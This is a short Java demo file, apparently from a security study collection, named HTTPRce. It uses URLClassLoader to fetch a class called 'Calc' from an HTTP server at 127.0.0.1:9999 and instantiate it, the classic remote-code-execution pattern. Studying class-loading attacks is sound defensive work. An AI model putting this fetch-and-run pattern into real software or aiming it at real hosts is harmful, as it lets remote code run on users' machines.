package src.DynamicClassLoader.URLClassLoader;

import java.net.URL;
import java.net.URLClassLoader;

// URLClassLoader 的 HTTP 协议
public class HTTPRce {
    public static void main(String[] args) throws Exception{
        URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL("http://127.0.0.1:9999")});
        Class calc = urlClassLoader.loadClass("Calc");
        calc.newInstance();
    }
}
